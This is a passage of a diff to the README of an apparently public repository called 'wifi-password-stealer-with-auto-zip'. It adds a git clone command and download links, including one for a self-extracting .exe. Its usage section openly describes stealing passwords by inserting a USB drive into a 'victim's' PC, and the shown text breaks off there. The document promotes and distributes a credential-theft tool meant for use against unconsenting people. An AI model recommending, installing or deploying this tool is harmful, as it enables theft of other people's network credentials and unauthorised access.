@@ -10,11 +10,12 @@ the file will be password protected. the password of the file is
  the name of the zip file(withou .zip).
 # Installation
 installation is very easy. just clone the repo and extract that zip file.
-```git
+```shell
+git clone https://github.com/OCEANOFANYTHINGOFFICIAL/wifi-password-stealer-with-auto-zip.git
 ```
 ## OR
 # Directly Download The Zip File By [Clicking Here](https://github.com/OCEANOFANYTHINGOFFICIAL/wifi-password-stealer-with-auto-zip/archive/refs/heads/main.zip) 
-### Directly Download The Zip File By [Clicking Here](https://github.com/OCEANOFANYTHINGOFFICIAL/wifi-password-stealer-with-auto-zip/releases/download/1.0/wifi.password.extractor.with.auto.zip.exe) 
+# Directly Download The Self Extractor File By [Clicking Here](https://github.com/OCEANOFANYTHINGOFFICIAL/wifi-password-stealer-with-auto-zip/releases/download/1.0/wifi.password.extractor.with.auto.zip.exe) 
 # Usage
 You can use it to steale passwords from a pc.
 just copy all files in a usb thumb drive. then insert that in victim's
